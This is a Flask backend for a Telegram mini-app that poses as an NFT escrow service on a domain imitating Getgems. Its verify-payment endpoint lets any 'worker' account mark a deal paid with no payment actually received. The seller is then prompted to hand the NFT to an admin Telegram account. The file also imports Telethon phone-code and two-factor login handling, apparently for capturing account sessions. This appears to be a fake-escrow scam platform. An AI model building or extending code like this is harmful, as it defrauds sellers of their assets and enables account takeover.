from flask import Flask, request, jsonify, send_from_directory, Request, render_template, abort
from flask_cors import CORS
from werkzeug.exceptions import UnsupportedMediaType, RequestEntityTooLarge
from database import db
from config import Config
from telegram_client import TelegramAuth, run_async
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from utils import (
    save_session_data, load_session_data, clear_session_data,
    get_phone_from_json, check_session_exists, validate_session,
    create_session_json
)
from bot import send_payment_notification
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from config import Config
import logging
import secrets
import asyncio
import os
import json
import re
from datetime import datetime
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, 
            static_folder='static', 
            static_url_path='/static',
            template_folder='templates')
app.secret_key = secrets.token_hex(16)
# Увеличиваем лимит размера загружаемых файлов до 50MB (для фото)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50 MB
# Разрешаем CORS для домена getgems.mooo.com
CORS(app, origins=["https://getgems.mooo.com", "http://localhost:5173", "http://localhost:5000"])

# Middleware для предотвращения автоматического парсинга JSON для multipart запросов
@app.before_request
def prevent_json_parsing_for_multipart():
    """Предотвратить автоматический парсинг JSON для multipart/form-data запросов"""
    if request.method == 'POST':
        content_type = request.content_type or ''
        try:
            mime_type = request.mimetype
        except (TypeError, AttributeError):
            mime_type = "(unavailable)"
        logger.info(f"[BEFORE_REQUEST] Content-Type: {content_type}, MIME: {mime_type}, Path: {request.path}")
        # Если это multipart, очищаем кеш JSON чтобы Flask не пытался парсить
        if 'multipart/form-data' in content_type:
            logger.info("[BEFORE_REQUEST] Detected multipart, preventing JSON parsing")
            # Очищаем кеш JSON, чтобы Flask не пытался автоматически парсить
            if hasattr(request, '_cached_json'):
                request._cached_json = None
            # Устанавливаем флаг, что это не JSON - это критически важно!
            if hasattr(request, '_is_json'):
                request._is_json = False
            # НЕ трогаем _parsed_content_type - это сломает доступ к request.files и request.form!

# Переопределяем is_json для предотвращения автоматического парсинга multipart как JSON
from flask import Request
from werkzeug.exceptions import UnsupportedMediaType

class CustomRequest(Request):
    """Кастомный Request класс для предотвращения парсинга multipart как JSON"""
    @property
    def is_json(self):
        """Переопределяем is_json чтобы multipart не считался JSON"""
        ct = self.content_type or ''
        if 'multipart/form-data' in ct:
            return False
        return super(CustomRequest, self).is_json
    
    def get_json(self, force=False, silent=False, cache=True):
        """Переопределяем get_json чтобы не парсить multipart - это КРИТИЧЕСКИ ВАЖНО!"""
        ct = self.content_type or ''
        if 'multipart/form-data' in ct:
            if silent:
                return None
            # Не поднимаем исключение, просто возвращаем None если silent=True
            # Это предотвратит ошибку 415
            return None
        return super(CustomRequest, self).get_json(force=force, silent=silent, cache=cache)

# Заменяем Request класс в приложении
app.request_class = CustomRequest

# Обработчик ошибки 413 Request Entity Too Large
@app.errorhandler(RequestEntityTooLarge)
def handle_413_error(e):
    """Обработка ошибки 413 Request Entity Too Large"""
    logger.error(f"413 Error caught: {e}")
    logger.error(f"Content-Type: {request.content_type}")
    logger.error(f"Path: {request.path}")
    logger.error(f"Content-Length: {request.content_length if hasattr(request, 'content_length') else 'unknown'}")
    
    # Возвращаем JSON вместо HTML
    return jsonify({
        'success': False,
        'error': 'Файл слишком большой. Максимальный размер: 50 МБ. Пожалуйста, выберите файл меньшего размера.'
    }), 413

# Обработчик ошибки 415 для multipart запросов
@app.errorhandler(UnsupportedMediaType)
def handle_415_error(e):
    """Обработка ошибки 415 Unsupported Media Type"""
    logger.error(f"415 Error caught: {e}")
    logger.error(f"Content-Type: {request.content_type}")
    logger.error(f"MIME Type: {request.mimetype}")
    logger.error(f"Path: {request.path}")
    
    # Если это multipart запрос, возвращаем понятную ошибку
    if request.content_type and 'multipart/form-data' in request.content_type:
        logger.error("415 error for multipart request - Flask tried to parse as JSON")
        return jsonify({
            'success': False,
            'error': 'Server configuration error: multipart request was parsed as JSON. Please contact administrator.'
        }), 415
    
    return jsonify({'success': False, 'error': 'Unsupported Media Type. Please check Content-Type header.'}), 415

# Инициализация базы данных
db.init_database()

# Кеш для фото пользователей (telegram_id -> photo_url)
_user_photo_cache = {}

def get_user_photo_url(telegram_id: int) -> str | None:
    """Получить URL фото профиля пользователя через Telegram Bot API с кешированием"""
    try:
        if not Config.BOT_TOKEN:
            logger.warning("BOT_TOKEN not set, cannot get user photos")
            return None
        
        # Проверяем кеш
        if telegram_id in _user_photo_cache:
            cached_url = _user_photo_cache[telegram_id]
            if cached_url:  # Не возвращаем None из кеша, если он был установлен при ошибке
                logger.debug(f"Using cached photo URL for user {telegram_id}")
                return cached_url
        
        # Создаем синхронную обертку для асинхронного вызова
        async def _get_photo():
            bot = Bot(token=Config.BOT_TOKEN)
            try:
                logger.info(f"📸 Fetching photo for user {telegram_id} from Telegram Bot API")
                # Получаем фото профиля пользователя
                photos = await bot.get_user_profile_photos(telegram_id, limit=1)
                if photos and photos.total_count > 0 and photos.photos:
                    # Берем первое фото (самое большое)
                    photo = photos.photos[0][-1]  # Последний элемент - самое большое фото
                    # Получаем file_path
                    file = await bot.get_file(photo.file_id)
                    # Формируем URL - file.file_path уже содержит полный путь
                    if file.file_path:
                        # Если file_path уже содержит полный URL, используем его, иначе формируем
                        if file.file_path.startswith('http'):
                            photo_url = file.file_path
                        else:
                            photo_url = f"https://api.telegram.org/file/bot{Config.BOT_TOKEN}/{file.file_path}"
                    else:
                        # Если file_path нет, используем file_id напрямую (не рекомендуется, но работает)
                        photo_url = f"https://api.telegram.org/file/bot{Config.BOT_TOKEN}/{photo.file_id}"
                    logger.info(f"✅ Successfully got photo URL for user {telegram_id}: {photo_url[:80]}...")
                    # Сохраняем в кеш
                    _user_photo_cache[telegram_id] = photo_url
                    return photo_url
                else:
                    logger.info(f"⚠️ No photos found for user {telegram_id} (total_count: {photos.total_count if photos else 0})")
                    # НЕ кешируем None, чтобы можно было попробовать снова
                    return None
            except Exception as e:
                logger.error(f"❌ Failed to get photo for user {telegram_id}: {e}", exc_info=True)
                # НЕ кешируем None при ошибке, чтобы можно было попробовать снова
                return None
            finally:
                try:
                    await bot.close()
                except:
                    pass
        
        # Запускаем асинхронную функцию в отдельном потоке для избежания проблем с event loop
        import threading
        result = [None]
        exception = [None]
        
        def run_in_thread():
            try:
                new_loop = asyncio.new_event_loop()
                asyncio.set_event_loop(new_loop)
                result[0] = new_loop.run_until_complete(_get_photo())
                new_loop.close()
            except Exception as e:
                exception[0] = e
                logger.error(f"Error in thread for getting photo: {e}", exc_info=True)
        
        thread = threading.Thread(target=run_in_thread, daemon=True)
        thread.start()
        thread.join(timeout=10)  # Увеличиваем timeout до 10 секунд
        
        if thread.is_alive():
            logger.warning(f"Photo fetch for user {telegram_id} timed out")
            return None
        
        if exception[0]:
            logger.error(f"Exception in photo fetch thread: {exception[0]}")
            return None
        
        return result[0]
    except Exception as e:
        logger.error(f"Error getting user photo: {e}")
        return None

def _send_bot_notification_for_new_message(deal_id: int, sender_user_id: int, sender_username: str, message_text: str, deal: dict):
    """Отправить уведомление в Telegram бот о новом сообщении в чате сделки"""
    try:
        # Проверяем, что deal не None и является словарем
        if not deal or not isinstance(deal, dict):
            logger.warning(f"Invalid deal parameter in _send_bot_notification_for_new_message: {type(deal)}")
            return
        
        # Получаем другого участника сделки (не отправителя)
        seller_id = deal.get('seller_id')
        buyer_id = deal.get('buyer_id')
        
        # Определяем, кому отправлять уведомление
        recipient_id = None
        if seller_id and seller_id != sender_user_id:
            recipient_id = seller_id
        elif buyer_id and buyer_id != sender_user_id:
            recipient_id = buyer_id
        
        if not recipient_id:
            logger.info(f"No recipient for notification in deal {deal_id} (sender: {sender_user_id})")
            return  # Нет получателя для уведомления
        
        # Получаем настройки получателя
        recipient = db.get_user_by_id(recipient_id)
        if not recipient or not recipient.get('telegram_id'):
            logger.info(f"Recipient {recipient_id} has no telegram_id")
            return  # У получателя нет telegram_id
        
        # Проверяем, включены ли уведомления в боте
        settings = db.get_user_settings(recipient_id)
        if not settings.get('bot_notifications_enabled', True):
            logger.info(f"Bot notifications disabled for user {recipient_id}")
            return
        
        # Проверяем, прочитал ли получатель последние сообщения (не находится ли он в чате)
        import sqlite3
        conn = sqlite3.connect(db.db_path, timeout=10.0)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT last_read_message_id FROM chat_read_status
            WHERE user_id = ? AND deal_id = ?
        ''', (recipient_id, deal_id))
        row = cursor.fetchone()
        last_read_message_id = row[0] if row else 0
        conn.close()
        
        # Получаем ID последнего сообщения в чате
        all_messages = db.get_deal_messages(deal_id, limit=1)
        if all_messages:
            last_message_id = all_messages[-1].get('id', 0)
            # Если пользователь уже прочитал последнее сообщение (или почти последнее), не отправляем уведомление
            # Это означает, что он находится в чате
            if last_read_message_id >= last_message_id - 1:  # -1 для учета возможной задержки
                logger.info(f"User {recipient_id} is in chat (last_read: {last_read_message_id}, last_message: {last_message_id}), skipping notification")
                return
        
        # Получаем информацию о сделке
        deal_title = deal.get('title', f'Сделка #{deal_id}')
        
        # Формируем текст уведомления
        message_preview = message_text[:100] + ('...' if len(message_text) > 100 else '')
        notification_text = (
            f"💬 <b>Новое сообщение в сделке #{deal_id}</b>\n\n"
            f"📋 <b>{deal_title}</b>\n"
            f"👤 От: @{sender_username}\n"
            f"💭 {message_preview}"
        )
        
        # Определяем chat_id для кнопки (правильный формат)
        # chat_id = deal_id * 10000 + recipient_id * 10 + (1 если продавец, 2 если покупатель)
        chat_id_suffix = 1 if recipient_id == seller_id else 2
        chat_id = deal_id * 10000 + recipient_id * 10 + chat_id_suffix
        chat_url = f"{Config.MINI_APP_URL}/messages?chatId={chat_id}"
        
        # Создаем кнопку для перехода в чат
        keyboard = [
            [InlineKeyboardButton("💬 Перейти в чат", web_app=WebAppInfo(url=chat_url))]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Отправляем уведомление асинхронно
        async def send_notification():
            try:
                bot = Bot(token=Config.BOT_TOKEN)
                await bot.send_message(
                    chat_id=recipient['telegram_id'],
                    text=notification_text,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                logger.info(f"✅ Sent bot notification to user {recipient_id} (telegram_id: {recipient['telegram_id']}) about message in deal {deal_id}")
            except Exception as e:
                logger.error(f"❌ Failed to send bot notification: {e}", exc_info=True)
            finally:
                try:
                    await bot.close()
                except:
                    pass
        
        # Запускаем асинхронную функцию в отдельном потоке
        import threading
        def run_in_thread():
            try:
                new_loop = asyncio.new_event_loop()
                asyncio.set_event_loop(new_loop)
                new_loop.run_until_complete(send_notification())
                new_loop.close()
            except Exception as e:
                logger.error(f"Error in thread for sending notification: {e}", exc_info=True)
        
        thread = threading.Thread(target=run_in_thread, daemon=True)
        thread.start()
        thread.join(timeout=5)  # Timeout 5 секунд
        
        if thread.is_alive():
            logger.warning(f"Notification send for user {recipient_id} timed out")
            
    except Exception as e:
        logger.error(f"Error in _send_bot_notification_for_new_message: {e}", exc_info=True)

# Путь к собранному фронтенду
DIST_FOLDER = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'dist')

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})

@app.route('/api/deals', methods=['GET'])
def get_deals():
    """Получить список активных сделок"""
    try:
        status = request.args.get('status', 'active')
        deals = db.get_deals(status=status)
        return jsonify({'success': True, 'deals': deals})
    except Exception as e:
        logger.error(f"Error getting deals: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals', methods=['POST'])
def create_deal():
    """Создать новую сделку (без обязательной авторизации)"""
    try:
        data = request.get_json() or {}
        
        # Получаем данные из init_data если есть, но не требуем обязательной авторизации
        init_data = data.get('init_data') or data.get('initData')
        user_info = None
        if init_data:
            user_info = get_user_from_init_data(init_data)
        
        # Параметры сделки
        title = data.get('title')
        description = data.get('description')
        category = data.get('category')
        price = data.get('price')
        currency = data.get('currency', 'RUB')
        
        if not all([title, description, category, price]):
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        
        # Если пользователь авторизован, используем его ID, иначе создаем анонимную сделку
        seller_id = None
        seller_username = 'Анонимный пользователь'
        
        if user_info:
            user = db.get_or_create_user(
                telegram_id=user_info['id'],
                username=user_info.get('username', ''),
                first_name=user_info.get('first_name', ''),
                last_name=user_info.get('last_name', '')
            )
            seller_id = user['id']
            seller_username = user_info.get('username') or f"user_{user_info['id']}"
        
        deal_id = db.create_deal(
            seller_id=seller_id,
            seller_username=seller_username,
            title=title,
            description=description,
            category=category,
            price=float(price),
            currency=currency,
            is_anonymous=not bool(user_info)
        )
        
        deal = db.get_deal_by_id(deal_id)
        
        # Логируем создание сделки в форум-чат
        try:
            from forum_logger import log_deal_created, run_async as run_async_log
            
            # Получаем telegram_id продавца из БД, если user_info отсутствует
            telegram_id = None
            if user_info:
                telegram_id = user_info['id']
            elif seller_id:
                seller_db = db.get_user_by_id(seller_id)
                if seller_db:
                    telegram_id = seller_db.get('telegram_id')
            
            seller_info = {
                'telegram_id': telegram_id,
                'username': seller_username,
                'id': seller_id
            }
            deal_data = {
                'title': title,
                'description': description,
                'price': price,
                'currency': currency,
                'category': category,
                'created_at': deal.get('created_at', datetime.now().isoformat()) if deal else datetime.now().isoformat()
            }
            
            logger.info(f"📝 Attempting to log deal creation for deal {deal_id}: seller_info={seller_info}, deal_data={deal_data}")
            
            result = run_async_log(log_deal_created(deal_id, seller_info, deal_data))
            if not result:
                logger.error(f"❌ Failed to log deal creation for deal {deal_id}")
            else:
                logger.info(f"✅ Successfully logged deal creation for deal {deal_id}")
        except Exception as e:
            logger.error(f"❌ Exception while logging deal creation for deal {deal_id}: {e}", exc_info=True)
            import traceback
            logger.error(traceback.format_exc())
        
        # Добавляем системное сообщение о сделке в чат
        try:
            from config import Config as AppConfig
            bot_username = getattr(AppConfig, "BOT_USERNAME", "Urionsbot")
            
            system_message = (
                f"<b>Urions Garant Bot</b>\n\n"
                f"<b>Сделка #{deal_id}</b>\n\n"
                f"<b>Название:</b> {title}\n"
                f"<b>Описание:</b> {description}\n"
                f"<b>Сумма:</b> {price} {currency}\n"
                f"<b>Категория:</b> {category}\n\n"
                f"<b>Важно:</b> Все сделки проходят внутри гарант-бота. "
                f"Переходы в личные сообщения Telegram могут быть небезопасны. "
                f"Если вы столкнетесь с мошенническими действиями, рекомендуем пожаловаться на пользователя."
            )
            
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,  # Системное сообщение
                sender_username='Urionsbot',
                text=system_message,
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to create system message for deal {deal_id}: {e}")
        
        # Добавим ссылку-приглашение, если есть токен
        try:
            from urllib.parse import quote
            bot_username = getattr(AppConfig, "BOT_USERNAME", "Urionsbot")
            if deal and deal.get('invite_token'):
                token = deal['invite_token']
                deal['invite_telegram_url'] = f"https://t.me/{bot_username}?start=deal_{quote(token)}"
        except Exception as e:
            logger.warning(f"Failed to build invite link: {e}")
        return jsonify({'success': True, 'deal': deal})
    except Exception as e:
        logger.error(f"Error creating deal: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>', methods=['GET'])
def get_deal(deal_id):
    """Получить информацию о сделке"""
    try:
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404

        # Добавляем ссылку-приглашение для Telegram, если есть токен
        try:
            from config import Config as AppConfig
            from urllib.parse import quote
            bot_username = getattr(AppConfig, "BOT_USERNAME", "Urionsbot")
            if deal.get('invite_token'):
                token = deal['invite_token']
                deal['invite_telegram_url'] = f"https://t.me/{bot_username}?start=deal_{quote(token)}"
        except Exception as e:
            logger.warning(f"Failed to build invite link in get_deal: {e}")

        return jsonify({'success': True, 'deal': deal})
    except Exception as e:
        logger.error(f"Error getting deal: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/join', methods=['POST'])
def join_deal(deal_id):
    """Присоединиться к сделке как покупатель"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        if deal['status'] != 'active':
            return jsonify({'success': False, 'error': 'Deal is not active'}), 400
        
        # Получаем или создаем пользователя
        user = db.get_or_create_user(
            telegram_id=user_info['id'],
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        buyer_username = user_info.get('username') or f"user_{user_info['id']}"
        
        # Устанавливаем покупателя
        db.set_deal_buyer(deal_id, user['id'], buyer_username)
        
        # Логируем присоединение покупателя в форум-чат
        try:
            from forum_logger import log_deal_joined, run_async as run_async_log
            buyer_info = {
                'telegram_id': user_info['id'],
                'username': buyer_username,
                'id': user['id']
            }
            deal_data = {
                'title': deal.get('title', 'N/A'),
                'price': deal.get('price', 0),
                'currency': deal.get('currency', 'RUB')
            }
            result = run_async_log(log_deal_joined(deal_id, buyer_info, deal_data))
            if not result:
                logger.error(f"❌ Failed to log deal join for deal {deal_id}")
            else:
                logger.info(f"✅ Successfully logged deal join for deal {deal_id}")
        except Exception as e:
            logger.error(f"❌ Exception while logging deal join for deal {deal_id}: {e}", exc_info=True)
        
        # Системное сообщение в чат сделки
        try:
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,  # Системное сообщение
                sender_username='Urionsbot',
                text=f"К сделке присоединился покупатель @{buyer_username}.",
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to add join message for deal {deal_id}: {e}")
        
        updated_deal = db.get_deal_by_id(deal_id)
        return jsonify({'success': True, 'deal': updated_deal})
    except Exception as e:
        logger.error(f"Error joining deal: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/pay', methods=['POST'])
def pay_deal(deal_id):
    """Инициализировать оплату сделки (присоединить покупателя и перевести в статус pending)"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        # Платёж можно инициировать только из активного или pending состояния,
        # чтобы избежать повторных попыток для уже оплаченных/закрытых сделок
        if deal['status'] not in ['active', 'pending']:
            return jsonify({'success': False, 'error': 'Deal is not available for payment'}), 400
        
        # Получаем или создаем пользователя
        user = db.get_or_create_user(
            telegram_id=user_info['id'],
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        # Если покупатель еще не установлен, устанавливаем его
        buyer_was_just_set = False
        if not deal.get('buyer_id'):
            buyer_username = user_info.get('username') or f"user_{user_info['id']}"
            db.set_deal_buyer(deal_id, user['id'], buyer_username)
            deal = db.get_deal_by_id(deal_id)  # Обновляем данные сделки
            buyer_was_just_set = True
        else:
            # Получаем username покупателя из БД
            buyer = db.get_user_by_id(deal.get('buyer_id'))
            buyer_username = buyer.get('username') if buyer else f"user_{deal.get('buyer_id')}"
        
        # Логируем присоединение покупателя в форум-чат, если он только что присоединился
        if buyer_was_just_set:
            try:
                from forum_logger import log_deal_joined, run_async as run_async_log
                buyer_info = {
                    'telegram_id': user_info['id'],
                    'username': buyer_username,
                    'id': user['id']
                }
                deal_data = {
                    'title': deal.get('title', 'N/A'),
                    'price': deal.get('price', 0),
                    'currency': deal.get('currency', 'RUB')
                }
                result = run_async_log(log_deal_joined(deal_id, buyer_info, deal_data))
                if not result:
                    logger.error(f"❌ Failed to log deal join from pay for deal {deal_id}")
                else:
                    logger.info(f"✅ Successfully logged deal join from pay for deal {deal_id}")
            except Exception as e:
                logger.error(f"❌ Exception while logging deal join from pay for deal {deal_id}: {e}", exc_info=True)
            
            # Добавляем системное сообщение о присоединении к сделке
            try:
                db.create_deal_message(
                    deal_id=deal_id,
                    sender_id=0,  # Системное сообщение
                    sender_username='Urionsbot',
                    text=f"К сделке присоединился покупатель @{buyer_username}.",
                    photo_url=None,
                    is_system=True
                )
            except Exception as e:
                logger.error(f"Failed to add join message from pay for deal {deal_id}: {e}")
        
        # Проверяем, что это покупатель (или устанавливаем покупателя, если его еще нет)
        if deal.get('buyer_id') and deal.get('buyer_id') != user['id']:
            return jsonify({'success': False, 'error': 'Only buyer can pay for this deal'}), 403
        
        # НЕ меняем статус здесь - статус будет изменен только после подтверждения оплаты воркером
        # Это позволяет покупателю повторно открыть модальное окно оплаты, если он случайно закрыл его

        updated_deal = db.get_deal_by_id(deal_id)
        return jsonify({'success': True, 'deal': updated_deal})
    except Exception as e:
        logger.error(f"Error paying deal: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/verify-payment', methods=['POST'])
def verify_payment(deal_id):
    """Проверить оплату сделки (воркеры могут автоматически подтверждать)"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        # На этом этапе ожидаем, что сделка либо активна, либо уже находится в ожидании оплаты.
        # Это позволяет воркеру подтвердить платеж после того, как покупатель инициировал оплату.
        if deal['status'] not in ['active', 'pending']:
            return jsonify({'success': False, 'error': 'Deal is not in a verifiable state'}, 400)
        
        # Получаем пользователя
        user = db.get_or_create_user(
            telegram_id=user_info['id'],
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        # Проверяем, является ли пользователь воркером
        is_worker = db.is_user_worker(user['id'])
        
        # Если воркер - автоматически подтверждаем оплату
        if is_worker:
            # Если покупатель еще не установлен, устанавливаем его
            buyer_was_set = False
            if not deal.get('buyer_id'):
                buyer_username = user_info.get('username') or f"user_{user_info['id']}"
                db.set_deal_buyer(deal_id, user['id'], buyer_username)
                deal = db.get_deal_by_id(deal_id)
                buyer_was_set = True
            else:
                # Получаем username покупателя из БД
                buyer = db.get_user_by_id(deal.get('buyer_id'))
                buyer_username = buyer.get('username') if buyer else f"user_{deal.get('buyer_id')}"
            
            # Логируем присоединение покупателя, если он только что присоединился
            if buyer_was_set:
                try:
                    from forum_logger import log_deal_joined, run_async as run_async_log
                    buyer_info = {
                        'telegram_id': user_info['id'],
                        'username': buyer_username or user_info.get('username') or f"user_{user_info['id']}",
                        'id': user['id']
                    }
                    deal_data = {
                        'title': deal.get('title', 'N/A'),
                        'price': deal.get('price', 0),
                        'currency': deal.get('currency', 'RUB')
                    }
                    result = run_async_log(log_deal_joined(deal_id, buyer_info, deal_data))
                    if not result:
                        logger.error(f"❌ Failed to log deal join from verify_payment for deal {deal_id}")
                    else:
                        logger.info(f"✅ Successfully logged deal join from verify_payment for deal {deal_id}")
                except Exception as e:
                    logger.error(f"❌ Exception while logging deal join from verify_payment for deal {deal_id}: {e}", exc_info=True)
            
            # Обновляем статус на "оплачено"
            db.update_deal_status(deal_id, 'paid')
            
            # Логируем оплату в форум-чат
            try:
                from forum_logger import log_deal_payment, run_async as run_async_log
                buyer_info = {
                    'telegram_id': user_info['id'],
                    'username': buyer_username if 'buyer_username' in locals() else (user_info.get('username') or f"user_{user_info['id']}"),
                    'id': user['id']
                }
                payment_data = {
                    'amount': deal.get('price', 0),
                    'currency': deal.get('currency', 'RUB')
                }
                result = run_async_log(log_deal_payment(deal_id, buyer_info, payment_data))
                if not result:
                    logger.error(f"❌ Failed to log deal payment for deal {deal_id}")
                else:
                    logger.info(f"✅ Successfully logged deal payment for deal {deal_id}")
            except Exception as e:
                logger.error(f"❌ Exception while logging deal payment for deal {deal_id}: {e}", exc_info=True)
            
            # Системные сообщения в чат сделки
            try:
                # Формируем информативное сообщение об оплате
                buyer_name = buyer_username if 'buyer_username' in locals() else (deal.get('buyer_username') or f"user_{deal.get('buyer_id')}")
                if buyer_name and not buyer_name.startswith('@'):
                    buyer_name = f"@{buyer_name}"
                
                price = deal.get('price', 0)
                currency = deal.get('currency', 'RUB')
                currency_symbols = {
                    'RUB': '₽',
                    'UAH': '₴',
                    'BYN': 'Br',
                    'TON': 'TON',
                    'USDT': 'USDT',
                    'STARS': 'STARS'
                }
                currency_display = currency_symbols.get(currency, currency)
                formatted_price = f"{price:,.0f}".replace(',', ' ') if price else "0"
                
                payment_message = f"Покупатель {buyer_name} совершил оплату {formatted_price} {currency_display} по сделке #{deal_id}"
                
                db.create_deal_message(
                    deal_id=deal_id,
                    sender_id=0,
                    sender_username='Urionsbot',
                    text=payment_message,
                    photo_url=None,
                    is_system=True
                )
                
                # Сообщение с кнопкой "Передать NFT" для продавца
                import json
                transfer_buttons = json.dumps([
                    {
                        "text": "Передать NFT",
                        "action": "url",
                        "url": "https://t.me/Urions_Admin"
                    }
                ])
                db.create_deal_message(
                    deal_id=deal_id,
                    sender_id=0,
                    sender_username='Urionsbot',
                    text="Передать NFT\n\nДля вашей безопасности, передача осуществляется менеджеру, автоматическое подтверждение после передачи NFT",
                    photo_url=None,
                    is_system=True,
                    buttons=transfer_buttons
                )
            except Exception as e:
                logger.error(f"Failed to add payment system messages for deal {deal_id}: {e}")
            
            # Отправляем уведомление продавцу
            seller = db.get_user_by_id(deal['seller_id'])
            if seller and seller.get('telegram_id'):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(
                        send_payment_notification(
                            seller['telegram_id'],
                            deal_id,
                            deal['price'],
                            deal.get('currency', 'RUB')
                        )
                    )
                    loop.close()
                except Exception as e:
                    logger.error(f"Error sending notification: {e}")

            # Убрано: отправка запроса воркеру на подтверждение получения подарка
            # Теперь покупатель подтверждает передачу средств напрямую в мини-приложении
            
            updated_deal = db.get_deal_by_id(deal_id)
            return jsonify({
                'success': True,
                'deal': updated_deal,
                'verified_by_worker': True
            })
        
        # Если не воркер - возвращаем информацию о необходимости проверки
        return jsonify({
            'success': False,
            'error': 'Payment verification requires worker status',
            'requires_worker': True
        }), 403
        
    except Exception as e:
        logger.error(f"Error verifying payment: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/deals/<int:deal_id>/confirm-transfer', methods=['POST'])
def confirm_transfer(deal_id):
    """
    Подтверждение передачи средств покупателем
    После подтверждения сделка завершается, средства зачисляются продавцу
    """
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Deal not found'}), 404
        
        # Проверяем, что пользователь - покупатель
        user = db.get_or_create_user(
            telegram_id=user_info['id'],
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        if deal.get('buyer_id') != user['id']:
            return jsonify({'success': False, 'error': 'Only buyer can confirm transfer'}), 403
        
        # Проверяем статус сделки
        if deal.get('status') != 'paid':
            return jsonify({'success': False, 'error': 'Deal is not paid'}), 400
        
        old_status = deal.get('status')
        
        # 1. Обновляем статус сделки на completed
        db.update_deal_status(deal_id, 'completed')
        logger.info(f"✅ Deal #{deal_id} status updated to 'completed' (was: {old_status})")
        
        # 2. Пополняем баланс продавца
        if deal.get('seller_id'):
            try:
                currency = deal.get('currency', 'RUB')
                price = deal.get('price', 0)
                seller_id = deal['seller_id']
                
                logger.info(f"💰 Adding balance: seller_id={seller_id}, amount={price}, currency={currency}")
                db.add_balance(seller_id, price, currency)
                logger.info(f"✅ Balance added for seller {seller_id}")
                
                # Уведомляем продавца о пополнении баланса
                seller = db.get_user_by_id(seller_id)
                if seller and seller.get('telegram_id'):
                    try:
                        import asyncio
                        from telegram import Bot
                        from config import Config
                        
                        async def send_balance_notification():
                            bot = Bot(token=Config.BOT_TOKEN)
                            await bot.send_message(
                                chat_id=seller['telegram_id'],
                                text=f"💰 Ваш баланс пополнен на {price} {currency} по сделке #{deal_id}.",
                                parse_mode="HTML"
                            )
                            await bot.close()
                        
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(send_balance_notification())
                        loop.close()
                        logger.info(f"✅ Balance notification sent to seller {seller_id}")
                    except Exception as e:
                        logger.error(f"❌ Failed to notify seller about balance: {e}", exc_info=True)
            except Exception as e:
                logger.error(f"❌ Failed to add balance for seller: {e}", exc_info=True)
        
        # 3. Создаем системное сообщение
        try:
            buyer_username = user_info.get('username') or f"user_{user_info['id']}"
            db.create_deal_message(
                deal_id=deal_id,
                sender_id=0,
                sender_username='Urionsbot',
                text=f"{buyer_username} подтвердил(а) передачу средств. Сделка завершена.",
                photo_url=None,
                is_system=True
            )
        except Exception as e:
            logger.error(f"Failed to add confirmation message: {e}")
        
